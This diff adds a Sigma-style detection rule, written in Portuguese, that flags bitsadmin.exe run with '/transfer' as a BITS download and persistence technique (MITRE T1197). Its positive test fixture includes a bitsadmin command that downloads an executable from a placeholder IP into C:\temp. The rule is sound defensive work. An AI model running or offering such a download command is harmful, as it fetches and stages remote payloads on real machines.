@@ -1,0 +1,28 @@
+title: 'Bitsadmin baixando arquivos'
+id: 'c78bf3b0-325c-501c-8557-658138962fba'
+status: 'stable'
+description: 'O BITS Admin transfere arquivos em segundo plano e pode ser usado para baixar e manter código no sistema.'
+references:
+    - 'https://attack.mitre.org/techniques/T1197/'
+author: 'RuleForge (regras de exemplo)'
+date: '2026/10/23'
+tags:
+    - 'attack.stealth'
+    - 'attack.persistence'
+    - 'attack.t1197'
+logsource:
+    category: 'process_creation'
+    product: 'windows'
+detection:
+    selection:
+        Image|endswith: '\bitsadmin.exe'
+        CommandLine|windash|contains: ' /transfer'
+    condition: 'selection'
+falsepositives:
+    - 'Ferramentas de atualização que usam o BITS'
+level: 'medium'
+x_tests:
+    positive:
+        - {Image: 'C:\Windows\System32\bitsadmin.exe', CommandLine: 'bitsadmin /transfer j http://203.0.113.5/a.exe C:\temp\a.exe'}
+    negative:
+        - {Image: 'C:\Windows\System32\bitsadmin.exe', CommandLine: 'bitsadmin /list'}
